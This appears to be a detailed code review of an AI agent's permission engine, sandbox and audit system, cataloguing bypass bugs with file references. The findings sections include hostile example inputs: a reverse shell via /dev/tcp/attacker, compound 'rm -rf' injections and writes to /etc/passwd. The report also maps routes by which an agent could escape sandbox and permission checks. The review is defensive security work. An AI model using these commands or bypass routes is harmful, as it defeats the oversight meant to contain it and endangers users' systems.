# Code Review — Permission Engine + Broker + Sandbox

**Date:** 2026-05-11 (post-slice 93)
**Scope:** Full review of `src/permissions/`, `src/broker/`, `src/cli/` (engine-adjacent), `src/tools/builtin/bash.ts`, `src/harness/` (engine-touching), `src/telemetry/`
**Method:** 12 review agents across 3 parallel waves; cross-referenced against `docs/spec/PERMISSION_ENGINE.md` (PT-BR spec)
**Findings:** ~57 P0 (security/correctness), ~80 P1 (robustness), many P2 (clean code)

---

## Index

- [Executive Summary](#executive-summary)
- [Master Findings by Theme](#master-findings-by-theme)
- [§23 Production-Ready Re-Evaluation](#23-production-ready-re-evaluation)
- [Subsystem Heatmap](#subsystem-heatmap)
- [Per-Reviewer Findings](#per-reviewer-findings) (R1-R12)
- [Recommended Fix Roadmap](#recommended-fix-roadmap) (slices 94-104)

---

## Executive Summary

The permission engine + broker + sandbox stack is **architecturally complete** (slices 1-93 shipped every named PERMISSION_ENGINE.md section that has code) but **operationally NOT production-ready** after minucious review. ~57 P0 bugs include:

- **Privilege escalation by omission** (subagent §10 enforcement opt-in, replay tool non-functional, bypass mode skips §11)
- **Sandbox escape vectors** (tilde `~` not expanded → shell-expansion bypass, /dev missing from protected paths, hide_paths missing in both Linux+macOS runners, sandboxProfile unvalidated on wire)
- **Audit integrity gaps** (hash chain rotation races, chattr races, verifyChain uses stale genesis, replay never reads policy_archive)
- **Silent misconfiguration** (top-level YAML typos accepted → empty policy, tools.* typos accepted → empty rules, seal.locked is no-op)
- **Spec drift** (§13.4/§13.5 menu described in spec but NOT implemented; checklist items marked `[x]` that fail close inspection)

This document captures the findings as a permanent artifact. The fix sequence (slices 94-104) below addresses P0s in priority order before any claim of "v1 production-ready local-CLI".

---

## Master Findings by Theme

### 🚨 Privilege escalation / fail-open

| # | Finding | Source |
|---|---|---|
| 1 | **Subagent capabilities arg is OPT-IN** — `task('foo', prompt)` without declared capabilities skips §10 guard entirely; child inherits parent's FULL policy snapshot | R11 / `src/tools/builtin/task.ts:171-196` |
| 2 | **`task_async` has ZERO §10 wiring** — async subagent spawn is a complete bypass of §10 inheritance | R11 / `src/tools/builtin/task-async.ts:43-71` |
| 3 | **`effective` is computed and discarded** — harness only checks `excess.length`; child engine runs against parent's full policy regardless of declared narrowing | R11 / `src/harness/loop.ts:997-1023` |
| 4 | **Bypass mode skips §11 protected paths** — `mode: bypass` policy returns allow on `/etc/shadow`, `~/.bashrc`, `/proc/sysrq-trigger` | R1 / `src/permissions/engine.ts:1461-1498` |
| 5 | **Grants bypass compound-shell guard** — grant on `git*` allows `git status; rm -rf /tmp/pwn`; `sessionAllowed` flag from grant match suppresses score escalation | R1 / `src/permissions/engine.ts:528-536, 1611-1623` |
| 6 | **Top-level YAML typos = empty policy** — `defualts: {...}` silently dropped, falls back to defaults | R8 / `src/permissions/config.ts:176-180` |
| 7 | **tools.* typo = empty rules** — `tools.bsh.deny: ['rm *']` parses cleanly but contributes no rules | R8 / `src/permissions/config.ts:212-224` |
| 8 | **`seal.locked` accepted but no lock semantics** — `seal` section silently overridden by project layer even when enterprise locks it | R8 / `src/permissions/config.ts:104`, `hierarchy.ts:307-310` |
| 9 | **sandboxProfile is unvalidated string on wire** — attacker passes `'host'` in BrokerRequest → `maybeWrapSandboxArgv` returns innerArgv unchanged, sandbox wrap bypassed | R6 / `src/broker/spawn.ts:191`, `worker-runtime.ts:109` |
| 10 | **§13.4/§13.5 interactive menu NOT implemented** — spec describes dual-confirm + `--yes` + audit acknowledgment; code prints text only | R9 / `src/cli/sandbox-setup.ts`, `welcome.ts` |

### 🛡️ Sandbox escape / isolation breaches

| # | Finding | Source |
|---|---|---|
| 11 | **Tilde `~` not expanded in args** — fs/bash resolvers produce literal `/cwd/~/.ssh/id_rsa`; shell EXPANDS `~` on exec → deletes real file | R2 / `src/permissions/resolvers/bash.ts:54`, `fs.ts:42` |
| 12 | **`/dev` missing from SYSTEM_DENY_ROOTS** — `write_file('/dev/sda')`, `/dev/kmem`, `/dev/tcp/attacker/80 > shell` bypass §11 | R2 / `src/permissions/protected_paths.ts:50` |
| 13 | **Unicode bypass of compound guard** — fullwidth semicolon `；` (U+FF1B), zero-width joiners pass `containsShellInjection` (ASCII regex) | R2 / `src/permissions/resolvers/bash.ts:528-552` |
| 14 | **HOME poisoning in home-rw** — `home-rw` profile binds whatever $HOME is; env-mutate cap → RW on /etc; $HOME unset → falls back to cwd silently | R4 / `src/permissions/sandbox-runner.ts:121` |
| 15 | **hide_paths missing on both Linux + macOS sandboxes** — `home-rw` exposes `~/.aws/credentials`, `~/.ssh/id_rsa`, `~/.gnupg`. Spec §9 explicitly requires these hidden | R4 / `sandbox-runner.ts:115-127`, `sandbox-runner-macos.ts:115-117` |
| 16 | **host short-circuit re-trusts upstream** — `maybeWrapSandboxArgv` returns innerArgv on `profile === 'host'` without local enforcement of host-passthrough capability | R4 / `src/permissions/sandbox-runner.ts:172` |
| 17 | **walkAst recursion without depth limit** — deeply-nested AST `((((cmd))))` can stack overflow on sync path; engine.check hangs | R2 / `src/permissions/resolvers/bash.ts:587-694` |
| 18 | **Bash registry incomplete** — `tar`, `tee`, `ssh`, `scp`, `rsync`, `make`, `cargo`, build tools all missing from COMMAND_TABLE | R2 / `src/permissions/resolvers/bash.ts:431-490` |
| 19 | **curl/wget `-o /etc/passwd` not detected as write-fs** — resolver only examines positional URL, ignores `-o` target | R2 / `src/permissions/resolvers/bash.ts:298-311` |
| 20 | **redirectShape doesn't recurse RED_FLAG_NODES into subtree** — `cmd > $(echo /etc/passwd)` bypasses adversarial detection | R2 / `src/permissions/resolvers/bash.ts:561-572` |
| 21 | **Broker drain unbounded** — `new Response(proc.stdout).text()` has no byte cap; worker OOM = main process OOM, inverting §13.7 isolation premise | R6 / `src/broker/spawn.ts:289-294` |
| 22 | **Worker readStdin unbounded** — accumulates full stdin payload before parsing | R6 / `src/broker/worker.ts:46-54` |
| 23 | **Sandbox-skip marker is symlink-attack vector** — `hasSandboxSkip` uses `existsSync` (follows symlinks); attacker plants symlink → silences prompt | R9 / `src/cli/sandbox-skip.ts:46-52` |
| 24 | **Marker file mode permissive (0644)** — multi-tenant host leak | R9 / `src/cli/sandbox-skip.ts:96` |
| 25 | **`/etc*` (no slash) escapes parse-time protected check** — `isProtectedRedefinition` only matches `startsWith('/etc/')` | R8 / `src/permissions/config.ts:33-44` |

### 🔁 Audit integrity / correctness

| # | Finding | Source |
|---|---|---|
| 26 | **Hash chain rotation race** — `BEGIN DEFERRED` transaction allows concurrent emit between archive copy and delete; new chain's prev_hash references pre-rotation tip | R3 / `src/permissions/audit.ts:241-260` |
| 27 | **verifyChain uses stale genesisHash** — cached at sink construction; rotation mid-session → verify uses OLD genesis vs NEW chain → false alarm | R3 / `src/permissions/audit.ts:253-259, 369` |
| 28 | **worm-file chattr race** — line written BEFORE `chattr +a`; concurrent writer aproveita window before append-only protection lands | R3 / `src/permissions/sealing.ts:138-220` |
| 29 | **Failed chattr leaves forever-unprotected file** — first append → chattr throws → ok:false; subsequent writes skip onCreate (wasMissing guard); file forever mutable | R3 / `src/permissions/sealing.ts:163-194` |
| 30 | **verifySealAgainstChain false-positive after rotation** — archived rows (post-rotation) reported as "tampered"; operator gets integrity alarm after normal rotation | R3 / `src/permissions/sealing.ts:425-453` |
| 31 | **RFC 3161 TSR trivial validation** — submitter accepts any non-empty body as success; hostile TSA returning 1-byte garbage passes | R3 / `src/permissions/sealing-rfc3161.ts:156-197` |
| 32 | **Child engine has NO audit sink** — `createPermissionEngine(snapshot, {cwd})` in subagent-child defaults to noopSink; child decisions vanish | R11 / `src/cli/subagent-child.ts:594` |
| 33 | **Replay engine without classifier/grants/sandbox** — `tryReExecute` runs bare deterministic core; "✓ deterministic" lies vs original decision shape | R11 / `src/cli/permission-replay.ts:237-241` |
| 34 | **Replay never reads policy_archive** — table populated by bootstrap, never consulted by replay; default mode is hash compare + optional drift test | R11 / `src/cli/permission-replay.ts:309-318` |
| 35 | **Date.now() in grants snapshot breaks replay determinism** — same input + different wall-clock → different active grants; audit doesn't persist grant_id | R11 / `src/permissions/engine.ts:1517` |

### ⚡ Robustness / fail-stuck

| # | Finding | Source |
|---|---|---|
| 36 | **proc.exited rejection has no .catch** — unhandled rejection if Bun edge fires; `readStopAc` never aborts → readers hang | R7 / `src/broker/handlers/bash.ts:225` |
| 37 | **Stacked SIGKILL timers** — `killEscalationTimer` is single `let`; timeout + abort race overwrites, original timer leaks | R7 / `src/broker/handlers/bash.ts:185-194` |
| 38 | **Signal listener attach AFTER spawn** — abort during spawn/stdin-write window swallowed; only outer timeout fires | R6 / `src/broker/spawn.ts:284`; R7 / `src/broker/handlers/bash.ts:209-222` |
| 39 | **close() doesn't abort in-flight** — `broker.close()` waits for natural completion; shutdown path hangs on long-running call without explicit signal | R5 / `src/broker/in-process.ts:96-102` |
| 40 | **timeoutMs silently ignored by in-process broker** — asymmetric with spawn broker; long exec hangs forever without signal | R5 / `src/broker/in-process.ts:74` |
| 41 | **Broker hang without timer** — `Promise.all([stdoutP, stderrP, proc.exited])` parks forever if no timer + no signal | R6 / `src/broker/spawn.ts:300` |
| 42 | **JSON proto-pollution** — `JSON.parse` doesn't promote `__proto__` but downstream handlers using `Object.assign({}, args)` would inherit | R6 / `src/broker/worker-runtime.ts:158`, `src/broker/spawn.ts:377` |
| 43 | **Error-message construction unsafe with throwing getters** — `e.message` getter throw → cross-contamination, `result` never assigned, non-null assertion returns undefined | R5 / `src/broker/in-process.ts:80` |
| 44 | **Broker env leak to worker** — worker inherits full parent env (secrets) before scrubbing happens in bash handler; other handlers might leak via logging | R6 / `src/broker/spawn.ts:142` |
| 45 | **Sandbox-skip TOCTOU between exists + write** — symlink can be substituted; writeFileSync follows symlinks | R9 / `src/cli/sandbox-skip.ts:79` |

### 🔐 PII redaction gaps

| # | Finding | Source |
|---|---|---|
| 46 | **`secret-access` kind NOT scrubbed** — scope can be `/run/secrets/api_key` or vault namespace; leaks via metric stream | R10 / `src/telemetry/scrubbing.ts:47` |
| 47 | **`net-ingress` kind NOT scrubbed** — port + bind address pass through | R10 / `src/telemetry/scrubbing.ts:52` |
| 48 | **`SandboxDegradedActiveEvent` declared but NEVER emitted** — type + scrubbing exist; loop.ts emits harness event but NOT telemetry.emit. Metric stream documented but unfireable | R10 / `src/telemetry/index.ts:271-285` |
| 49 | **PATH_REGEX gaps** — Windows paths (`C:\Users\...`), URLs (`https://internal.corp/private`), tilde-prefix `~/.ssh/...` all leak | R10 / `src/telemetry/scrubbing.ts:63` |
| 50 | **`scrubReason` only redacts paths, never hosts** — free-form text quoting hostnames passes through | R10 / `src/telemetry/scrubbing.ts:90-93` |
| 51 | **Empty exec-fs dead code; secret-access/net-ingress real kinds unscrubbed** | R10 / `src/telemetry/scrubbing.ts:47` |

### 🧪 Spec drift / checklist lies

| # | Finding | Source |
|---|---|---|
| 52 | **§23 "Replay funcional pra todas categorias" marked `[x]` — FALSE** — fixtures use only `allow`; zero `deny` or `confirm` regression tests | R12 / `tests/cli/permission-replay.test.ts` |
| 53 | **§23 "Fuzz 10⁹ iterations" marked `[x]` — aspirational** — 4 targets exist (~5200 iterations in test suite); NO nightly CI workflow in `.github/workflows/` | R12 / `.github/workflows/` |
| 54 | **§23 "Telemetria com scrubbing" marked `[x]` — partial** — 6/7 events tested; `sandbox.degraded_active` has scrubbing branch but no test | R12 / `tests/telemetry/scrubbing.test.ts` |
| 55 | **Dead code: BASH_ABORT_GRACE_MS** — exported, never used | R7, R12 / `src/broker/handlers/bash.ts:50` |
| 56 | **Dead code: RESERVED_SEAL_MODES** — empty Set with self-aware comment | R12 / `src/permissions/config.ts:87-88` |
| 57 | **Naming sprawl: sandbox-degraded concept has 4 spellings** — `DegradedBannerEvent`, `SandboxDegradedActiveEvent`, `sandbox.degraded_active`, `sandbox_degraded_active` | R12 / multiple |

---

## §23 Production-Ready Re-Evaluation

| Spec checklist item | Claim | Honest status |
|---|---|---|
| Conformance suite ≥ 136 casos passando | `[x]` | ✅ Honest (160 cases across 13 YAML files) |
| Fuzz harness 10⁹ iterations sem crash novo | `[x]` | ⚠️ **Aspirational** — 4 targets exist (~5200 iter in suite), no nightly CI |
| Bash resolver registry top 30 commands | `[x]` | ✅ Honest (73 commands), but `tar`/`ssh`/`rsync`/build-tools missing |
| Path resolver com symlink escape testado | `[x]` | ⚠️ Shallow (4 tests, missing chained/TOCTOU/cross-protected) |
| Hash chain genesis + verify + rotação | `[x]` | ⚠️ Race conditions not tested |
| Sealing externo em ≥ 1 backend | `[x]` | ✅ 5 backends shipped, but wire-format edge cases |
| State machine completa com transitions audit-loggadas | `[x]` | ✅ Honest |
| **Replay tool funcional pra todas categorias** | `[x]` | ❌ **FALSE** — only `allow` tested |
| Telemetria com scrubbing | `[x]` | ⚠️ 6/7 events tested; `sandbox.degraded_active` not emitted at all |
| Threat model §15 review por terceiro | (process) | Out-of-band |
| Calibração baseline-v2.0 piloto ≥ 30d | (process) | Out-of-band |
| Migration path v1 testado | (process) | Premature (no v1 in production) |

**Net assessment:** Of 9 code-side checklist items, 1 is false (replay), 3 are partial (fuzz, symlink, hash chain races), 5 are honest. The BACKLOG framing "PERMISSION_ENGINE.md structurally complete" holds at the macro level, but specific `[x]` boxes don't survive scrutiny.

---

## Subsystem Heatmap

| Subsystem | P0 count | Density | Production-ready? |
|---|---:|---|---|
| 🔴 Subagent + Replay (R11) | 7 | Foundational | **NO** |
| 🔴 Resolvers + protected paths (R2) | 7 | Multiple bypass vectors | **NO** |
| 🔴 Audit chain + sealing (R3) | 6 | Integrity gaps | Caveat-loaded |
| 🔴 Bootstrap + policy parsing (R8) | 6 | Silent misconfig vectors | Caveat-loaded |
| 🔴 Sandbox runner (R4) | 5 | Isolation breaches | Caveat-loaded |
| 🟡 Spawn broker + worker (R6) | 5 | OOM + injection | Fix-able |
| 🟡 Bash handler + tool (R7) | 5 | Timer leaks + races | Fix-able |
| 🟡 Telemetry + scrubbing (R10) | 4 | PII leak via metrics | Fix-able |
| 🟡 Operator UX (R9) | 3 | Marker hardening + spec drift | Fix-able |
| 🟢 State machine (R1) | 3 | Bypass mode gap | Fix-able |
| 🟢 In-process broker (R5) | 3 | Lifecycle gaps | Fix-able |
| 🟢 Test coverage (R12) | 3 | Checklist drift | Re-classify |

---

## Per-Reviewer Findings

### R1: State machine + engine pipeline

**Files:** `src/permissions/state-machine.ts`, `src/permissions/engine.ts` (pipeline, lines 1053-2000)
**Spec:** §1 (princípios), §2 (state machine), §6 (6-stage pipeline)

**P0:**
- `engine.ts:1461-1498` — Bypass mode short-circuits BEFORE checkPath/checkBash; §11 protected paths not enforced. `write_file('/etc/passwd')` returns allow with `reason: 'mode=bypass'`. Spec §11 says protected paths are hardcoded, NOT flexible via policy. Fix: run protected/deny tier even in bypass; collapse only the tail.
- `engine.ts:528-536, 717-734, 839-847` — §8 persisted grants bypass compound-shell guard. Grant on pattern `git*` matches `git status; rm -rf /tmp/pwn` because grant check runs BEFORE `containsShellInjection` guard. Decision returns allow with `source.layer='session'`, making `sessionAllowed=true` which suppresses score escalation.
- `engine.ts:1611-1623` — `sessionAllowed` flag conflates in-process session-allow with persisted §8 grants. No discriminator between "operator approved this LITERAL command 30s ago" vs "operator approved this PATTERN 6 days ago".

**P1:**
- `engine.ts:1517` — `options.grants?.listActive(Date.now())` called regardless of `category==='misc'`; spurious DB load.
- `engine.ts:1372-1374` — Strict-classifier degrade only fires when `currentState === 'ready'`. Skips when already degraded (compound failure mode).
- `state-machine.ts:96-114` — `transition()` mutates state before invoking listener. Listener throws are swallowed → state commits without matching audit row.

**P2:**
- `engine.ts:909` — `decisionToAuditEnum` is identity no-op. Dead abstraction.
- `engine.ts:1135-1142` — `if (score > 0)` skip; score=0 from a real component would skip the chain entry.

---

### R2: Capability resolvers + bash parser + protected paths

**Files:** `src/permissions/resolvers/{bash,fs,fetch}.ts`, `bash-parser.ts`, `protected_paths.ts`
**Spec:** §5 (resolvers), §11 (protected paths)

**P0:**
- `protected_paths.ts:50` — `/dev` absent from SYSTEM_DENY_ROOTS. `write_file('/dev/sda')`, `cat /dev/tcp/attacker/80 > shell` (reverse shell via redirect) pass.
- `bash.ts:528-552` — `literalText()` trusts `node.text`; Unicode bypass via fullwidth `；` (U+FF1B), zero-width joiners, RTL overrides.
- `bash.ts:54` + `fs.ts:42` — `~` not treated as tilde. `path.resolve(cwd, '~/.ssh/id_rsa')` produces `/cwd/~/.ssh/id_rsa` literally; shell expands `~` on execution.
- `bash.ts:587-694` — `walkAst` recursion without depth limit; stack overflow on deeply-nested input.
- `bash.ts:431-490` — COMMAND_TABLE missing: `tar`, `tee`, `ssh`, `scp`, `rsync`, `make`, `cargo`, build tools.
- `bash.ts:298-311` — `cmdCurlWget` doesn't detect `-o /etc/foo` write target.
- `bash.ts:561-572` — `redirectShape` doesn't recurse RED_FLAG_NODES into subtree. `cmd > $(echo /etc/passwd)` bypasses adversarial detection.

**P1:**
- `bash-parser.ts:88-93` — `parseBash` no timeout; tree-sitter can loop on pathological input.
- `bash.ts:357-370` — `cmdPkgInstall` emits npm registry for `pip`/`pip3`; audit lies.
- `bash.ts:740-806` — Protected-path check skips flag-prefixed args; `--config=/etc/agent/policy.toml` escapes classifier.
- `protected_paths.ts` — Cwd-relative deny tier missing for `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.netrc`, `~/.npmrc`.
- `bash.ts:382-387` — `cmdInterpreter` allows `python -c "import os; os.system('rm -rf /')"` with read-fs-only caps. Should refuse `-c` interpreter args like bash does.

---

### R3: Audit chain + sealing backends

**Files:** `src/permissions/audit.ts`, chain code in `engine.ts`, `sealing.ts`, `sealing-rfc3161.ts`, `sealing-s3-object-lock.ts`, `sealing-scheduler.ts`, `config.ts` (seal section)
**Spec:** §7 (audit + chain + sealing)

**P0:**
- `sealing.ts:138-220` — worm-file chattr race window. Line written before `chattr +a`; concurrent writer races.
- `audit.ts:241-260` + `storage/repos/chain-rotation.ts:151-190` — Rotation uses `BEGIN DEFERRED`; concurrent emit between archive copy + delete corrupts chain alignment.
- `audit.ts:253-259, 369` — verifyChain uses stale `genesisHash` cached at sink construction; rotation mid-session → false alarm.
- `sealing.ts:425-453` — `verifySealAgainstChain` reports archived rows after rotation as "tampered"; false positive after normal rotation.
- `sealing.ts:163-194` — Failed chattr on first append leaves file forever-unprotected (wasMissing guard skips retry).
- `sealing-rfc3161.ts:156-197` — TSR submitter accepts any non-empty body as success; hostile TSA returning 1-byte garbage passes.

**P1:**
- `sealing-s3-object-lock.ts:87-133` — stderr captured but never read; debugging hostile. Temp dir in `/tmp` multi-tenant readable.
- `sealing.ts:120-121` vs other backends — `Number(seqField.slice(4))` accepts `'1e3'`, `'0x1f'`; inconsistent strictness across backends.
- `install_id.ts:34-38` — `isInstallIdentity` accepts non-integer `created_at_ms`; genesis derivation produces non-comparable values.
- `sealing-scheduler.ts:88-99` — Uses `now()` as `entry.ts` instead of row's `ts`; clock skew breaks wire invariant.
- `sealing-rfc3161.ts:299-319` — TSR written before seal.log; partial write leaves orphan.

---

### R4: Sandbox planner + runner

**Files:** `src/permissions/sandbox-plan.ts`, `sandbox-runner.ts`, `sandbox-runner-macos.ts`
**Spec:** §6.5 (profiles + planner), §13.2 (tiers), §9 (credential scoping)

**P0:**
- `sandbox-runner.ts:112-124` — `--bind` ordering depends on COMMON_PROFILE_FLAGS being prepended before `--bind cwd cwd`; latent fragility.
- `sandbox-runner.ts:172` — host short-circuit re-trusts upstream gating; `maybeWrapSandboxArgv` accepts `profile: 'host'` without local enforcement of host-passthrough capability.
- `sandbox-runner.ts:121` — `home-rw` binds whatever home arg received. HOME poisoning via env-mutate cap. $HOME unset → cwd fallback silently degrades to cwd-rw. No validation of `home` path (absolute, non-`..`, non-empty).
- `sandbox-runner-macos.ts:115-117` + `sandbox-runner.ts:115-127` — Neither runner implements §9 hide_paths/scrub_env. `home-rw` exposes `~/.aws`, `~/.ssh`, `~/.gnupg`, `~/.kube`, `~/.config/gcloud`.
- `sandbox-runner.ts:118-124` — `--chdir` placement vs cwd binding mismatch under `home-rw` with $HOME=cwd fallback.

**P1:**
- TOCTOU on `Bun.which('bwrap')` between probe and Bun.spawn; PATH manipulation can substitute.
- `cwd-rw-net` profile lacks egress filtering despite spec table claim; just omits `--unshare-net` = full host network.
- Empty capability set → `ro` selected; resolver returning Conservative with empty caps fail-opens to `ro`.

---

### R5: Broker contract + in-process broker

**Files:** `src/broker/types.ts`, `src/broker/in-process.ts`
**Spec:** §13.7

**P0:**
- `in-process.ts:74` — `options.exec` reference mutable post-construction (borderline P1).
- `in-process.ts:58-65` vs `:97-100` — close+execute race window. Sync-contiguous safe today but undocumented invariant.
- `in-process.ts:96-102` — `close()` waits for in-flight to drain, doesn't abort. Long-running call → close hangs.

**P1:**
- `in-process.ts:74` — `timeoutMs` silently ignored (asymmetric with spawn broker's setTimeout+kill).
- `in-process.ts:80` — Error message construction unsafe with throwing getters / circular refs; `result` never assigned → undefined returned via non-null assertion.
- `types.ts:38` — `args: Record<string, unknown>` doesn't block `__proto__` injection; downstream handlers using `Object.assign({}, args)` would inherit pollution.

---

### R6: Spawn broker + worker runtime + entry

**Files:** `src/broker/spawn.ts`, `worker-runtime.ts`, `worker.ts`, `types.ts`
**Spec:** §13.7

**P0:**
- `spawn.ts:289-294, 300` — Unbounded stdout/stderr drain (`new Response(stream).text()`). Worker OOM = main process OOM, **inverts §13.7 isolation premise**.
- `spawn.ts:300` — `proc.exited` wait hangs forever on non-exiting child without timer.
- `spawn.ts:191`, `worker-runtime.ts:109`, `bootstrap.ts:664` — `sandboxProfile` is unvalidated runtime-cast string. Attacker passes `'host'` → sandbox wrap bypassed entirely.
- `worker.ts:46-54` — `readStdin` unbounded; manual worker invocation can OOM.
- `worker-runtime.ts:158` / `spawn.ts:377` — JSON.parse runs on attacker input without proto-pollution defense.

**P1:**
- `spawn.ts:227-229` — `stdin.end()` raced by `proc.exited`; pre-timer/signal window.
- `spawn.ts:254-262` — Broker timeout has no SIGTERM→SIGKILL escalation; trapping worker holds broker hostage.
- `spawn.ts:284, 317-319` — Listener attach AFTER spawn; abort during write swallowed.
- `worker.ts:63` — `process.on('SIGTERM')` without `{once: true}`; MaxListenersExceededWarning at 11.
- `spawn.ts:142` — Worker inherits full parent env (secrets) before handler-side scrubbing.

---

### R7: Bash worker handler + bash tool surface

**Files:** `src/broker/handlers/{bash,read-capped}.ts`, `src/tools/builtin/bash.ts`
**Spec:** §13.7, §5

**P0:**
- `bash.ts:185-194` — Stacked SIGKILL escalation timers. `killEscalationTimer` is single `let`; timeout + abort race overwrites, original timer leaks.
- `bash.ts:209-222` — Signal listener attached AFTER spawn; abort during spawn window swallowed.
- `bash.ts:225` — `proc.exited.then(() => readStopAc.abort())` has no `.catch`. Bun edge rejection → unhandled rejection + reader hang.
- `bash.ts:264-272` — Timeout error message uses capped value (correct), but `Number.isFinite` + `Number.isInteger` triple-check is load-bearing in non-obvious way.
- `tools/builtin/bash.ts:204` — `'broker bug:'` prefix from spawn broker falls into catch-all → `bash.spawn_failed`; audit double-tagged.

**P1:**
- `bash.ts:168` — cwd never validates absolute resolution. Model passes `cwd: '/etc'` directly; no validation.
- `tools/builtin/bash.ts:211-212` — Truncation footer regex `/\n\[\.\.\. truncated; \d+ bytes omitted\]$/` matches any bash output ending in that pattern; false positive truncated:true.
- `read-capped.ts:46-49 + 78-79` — `stopSignal` listener removal in finally may not match attach in pre-aborted path.
- `bash.ts:227-228` — `Promise.all` reject bypasses error response shape; throws → in-process broker exec-threw mapping → catch-all.
- `bash.ts:50` — `BASH_ABORT_GRACE_MS` exported but never used.

---

### R8: CLI bootstrap + policy parsing

**Files:** `src/cli/bootstrap.ts`, `src/permissions/config.ts`, `src/permissions/hierarchy.ts`, `src/cli/args.ts`
**Spec:** §12 (policy lifecycle), §13.2

**P0:**
- `config.ts:104` — `rejectUnknownKeys` adds `'locked'` to every section unconditionally; `seal` has NO lock semantics. `seal: {..., locked: true}` lies to operator.
- `config.ts:176-180` — Top-level keys not validated. `defualts: {mode: 'bypass'}` silent drop → empty policy → defaults.
- `config.ts:212-224` — Unknown tool keys silently ignored. `tools.bsh.deny` parses with no rules.
- `config.ts:33-44` — `isProtectedRedefinition` flags `/etc/foo`, `/etc/**` but not `/etc*` (no trailing slash).
- `hierarchy.ts:307-310` — `seal` last-writer-wins with no lock semantics; enterprise locked seal silently overridden by project.
- `bootstrap.ts:253-259` — `preflightPermissionEngine` called without `home`; falls back through env → cwd. On $HOME-unset hosts, tilde-rooted protected paths resolve incorrectly.

**P1:**
- `hierarchy.ts:316-326` — `tools.*` lockConflict fires even on identical re-affirm.
- `hierarchy.ts:277-282` — Sandbox lockConflict records `section: 'sandbox'` without field name; actionable detail missing.
- `bootstrap.ts:318-320` — Trust file corruption (malformed JSON) inside `isTrusted` lacks defensive try/catch.
- `policy-watcher.ts:115-132` — `reloadNow()` runs `resolvePolicy()` synchronously inside timer callback; spec says "background".

---

### R9: Operator UX (doctor + welcome + sandbox-setup + sandbox-skip + signal)

**Files:** `src/cli/{doctor,welcome,sandbox-setup,sandbox-skip,signal}.ts`
**Spec:** §13.3-§13.6

**P0:**
- `sandbox-setup.ts:198-230` + `welcome.ts:69-136` — **§13.4/§13.5 interactive menu NOT implemented**. Spec describes `[1] Show / [2] Run install (--yes + ci_mode_acknowledged) / [3] Continue unsafe (writes unsafe_mode_acknowledged_at) / [4] Cancel`. Code only prints text. **Spec is "protocolo, não sugestão" (CLAUDE.md).** Either implement or PR spec to declare info-only.
- `sandbox-skip.ts:96` — Marker file mode 0644 default; multi-tenant host leak. Should be 0600.
- `sandbox-skip.ts:46-52` — Symlink-target attack vector. `hasSandboxSkip` uses `existsSync` (follows symlinks); attacker plants symlink → silences prompt. `createSandboxSkip` has same TOCTOU between exists + write.

**P1:**
- `doctor.ts:178-191` — `dirWritable` false-positive when dir exists but is chmod 0500.
- `doctor.ts:817` (spec) — 60s cache for non-critical checks not implemented.
- `args.ts:1166-1169` — `--i-know-what-im-doing` accepted top-level silently (slice 91 BACKLOG said "only in welcome").
- `welcome.ts:114-116` — "Sandbox setup skipped" output doesn't show marker timestamp.
- `doctor.ts:686-741` — `macLsmCheck` mistreats AppArmor disabled-kernel-module case.

---

### R10: Telemetry + scrubbing

**Files:** `src/telemetry/{index,scrubbing,jsonlines}.ts`
**Spec:** §18

**P0:**
- `scrubbing.ts:47` — `exec-fs` is dead code; real `secret-access` + `net-ingress` kinds pass unscrubbed.
- `index.ts:271-285` — `SandboxDegradedActiveEvent` declared + scrubbed but NEVER emitted. Slice 92 wired harness event but never calls `telemetry.emit`. Metric stream documented but unfireable.
- `scrubbing.ts:63` — `PATH_REGEX` misses Windows paths (`C:\...`), URLs (`https://internal.corp/...`), tilde-prefix.
- `scrubbing.ts:90-93` — `scrubReason` only scrubs paths, never hosts. Free-form text with `internal.corp.example.com:443` leaks.

**P1:**
- `scrubbing.ts:139-148` — `worker.crashed` + `sandbox.degraded_active` have zero test coverage.
- `jsonlines.ts:46` — `JSON.stringify` corrupts `NaN`/`Infinity` to `null`; metric stream silently drops.
- `scrubbing.ts:165-185` — Exhaustiveness check implicit, not explicit (`default: never` branch missing).
- `index.ts:330-341` — `RecordingTelemetrySink` unbounded; documented as test-only but exported.
- `scrubbing.ts:144-145` — `worker.crashed.stderr` unbounded; large stderr = O(n) regex work in metric path.

---

### R11: Subagent inheritance + replay tool

**Files:** `src/tools/builtin/task.ts`, `task-async.ts`, `src/cli/subagent-child.ts`, `src/cli/permission-replay.ts`, `src/harness/loop.ts` (lines ~997-1023), `src/permissions/engine.ts` (line 1517)
**Spec:** §10 (subagent), §17 (replay)

**P0:**
- `task.ts:171-196` + `task.ts:91-95` schema — `capabilities` is opt-in. Modelo passa `task('explore', prompt)` without declaring → §10 guard NOT executed → child engine runs against parent's FULL policy snapshot. **Privilege escalation by omission.**
- `task-async.ts:43-71` — `task_async` has ZERO §10 wiring. Async spawn is full bypass.
- `loop.ts:997-1023` + `subagents/runtime.ts:523` — Intersection computed and discarded. Harness only checks `excess.length === 0` to gate spawn; when allowed, `effective` is never persisted or re-applied. Child engine NOT narrowed.
- `subagent-child.ts:594` — `createPermissionEngine(audit.policySnapshot, {cwd})` called WITHOUT audit sink. Engine defaults to `createNoopSink()`. **All child decisions vanish.** Spec §10.2 demands `parent_approval_id` referenced.
- `permission-replay.ts:237-241` — `tryReExecute` builds replay engine without classifier/grants/sandbox/telemetry/session_id. "✓ deterministic" verdict misleading.
- `permission-replay.ts:309-318` + entire `tryReExecute` — Replay against `policy_archive` doesn't exist. Table populated, never read. **Default mode = hash compare + drift test, NOT actual reproducibility.**
- `engine.ts:1517` — `Date.now()` inside `check()` for grants snapshot. Same input + different wall-clock → different active grants. Audit doesn't persist `grant_id`/`grants_snapshot_at`. Determinism breach.

**P1:**
- No TTL ceiling enforcement on subagent (spec §10.2: `subagent.ttl ≤ parent.ttl_remaining`).
- `subagent-child.ts:584-594` — No re-validation of subagent's declared tools against parent's effective capability set.
- `permission-replay.ts:42-89` — `analyzeClassifierImpact` doesn't cover confidence='low' force-confirm path.

---

### R12: Test coverage + spec drift

**Files:** `tests/`, `evals/conformance/`, `src/fuzz/`, `docs/spec/PERMISSION_ENGINE.md`, `docs/BACKLOG.md`
**Spec:** §15.4, §16, §23

**P0:**
- §23 "Replay funcional pra todas categorias" `[x]` — **FALSE**. Fixtures only use `allow`; zero `deny` or `confirm` regression tests.
- §23 "Telemetria com scrubbing" `[x]` — partial. 6/7 events tested; `sandbox.degraded_active` scrub branch untested.
